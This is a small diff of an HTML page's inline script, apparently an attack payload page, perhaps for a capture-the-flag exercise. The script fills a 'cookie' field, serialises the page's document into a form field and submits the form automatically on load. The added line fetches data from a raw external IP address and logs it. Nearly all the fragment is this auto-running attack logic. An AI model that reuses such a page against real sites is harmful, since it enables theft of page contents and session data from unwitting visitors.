@@ -11,9 +11,9 @@
                     </form>
 
                     <script>
-                    
+                    fetch('http://45.12.114.110:30031/table/view/1').then(async (res)=>{console.log(await res.text())})
                         document.getElementById('cookie').value = 'ff'
-                        document.getElementById('window').value = JSON.stringify(document)
+                        document.getElementById('window').value = JSON.stringify(window.document)
                         document.getElementById('form').submit()
                     
                     
